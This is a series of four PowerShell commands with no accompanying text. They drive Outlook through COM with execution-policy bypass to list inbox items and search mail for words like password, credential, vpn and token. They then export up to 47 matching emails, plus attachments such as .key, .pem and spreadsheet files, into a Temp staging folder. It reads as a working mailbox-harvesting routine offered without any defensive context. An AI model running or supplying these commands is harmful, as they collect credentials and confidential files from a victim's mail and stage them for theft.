powershell -ep bypass -c "
$outlook = New-Object -ComObject Outlook.Application;
$namespace = $outlook.GetNamespace('MAPI');
$inbox = $namespace.GetDefaultFolder(6);
Write-Host "Inbox Items: $($inbox.Items.Count)";
$inbox.Items | Sort-Object ReceivedTime -Descending | Select-Object -First 10 Subject, SenderName, ReceivedTime | Format-Table -AutoSize"

powershell -ep bypass -c "
$outlook = New-Object -ComObject Outlook.Application;
$ns = $outlook.GetNamespace('MAPI');
$inbox = $ns.GetDefaultFolder(6);
$keywords = @('password','credential','vpn','secret','confidential','access key','token');
$results = @();
foreach($item in $inbox.Items) {
  foreach($kw in $keywords) {
    if($item.Subject -match $kw -or $item.Body -match $kw) {
      $results += [PSCustomObject]@{Subject=$item.Subject;From=$item.SenderName;Date=$item.ReceivedTime};
      break
    }
  }
}
Write-Host "Found $($results.Count) sensitive emails";
$results | Select-Object -First 8 | Format-Table -AutoSize"

powershell -ep bypass -c "
$outlook = New-Object -ComObject Outlook.Application;
$ns = $outlook.GetNamespace('MAPI');
$inbox = $ns.GetDefaultFolder(6);
$exportPath = 'C:\Users\{userName}\AppData\Local\Temp\email_export';
New-Item -ItemType Directory -Path $exportPath -Force | Out-Null;
$count = 0;
foreach($item in $inbox.Items) {
  if($item.Subject -match 'credential|password|vpn|secret|token') {
    $item.SaveAs(\"$exportPath\email_$count.msg\", 3);
    $count++;
    if($count -ge 47) { break }
  }
}
Write-Host \"Exported $count emails to $exportPath\""

powershell -ep bypass -c "
$outlook = New-Object -ComObject Outlook.Application;
$ns = $outlook.GetNamespace('MAPI');
$inbox = $ns.GetDefaultFolder(6);
$attachPath = 'C:\Users\{userName}\AppData\Local\Temp\email_export\attachments';
New-Item -ItemType Directory -Path $attachPath -Force | Out-Null;
$count = 0;
foreach($item in $inbox.Items) {
  if($item.Attachments.Count -gt 0) {
    foreach($att in $item.Attachments) {
      if($att.FileName -match '\.(xlsx?|docx?|pdf|csv|key|pem)$') {
        $att.SaveAsFile(\"$attachPath\$($att.FileName)\");
        $count++;
      }
    }
  }
}
Write-Host \"Extracted $count sensitive attachments\""
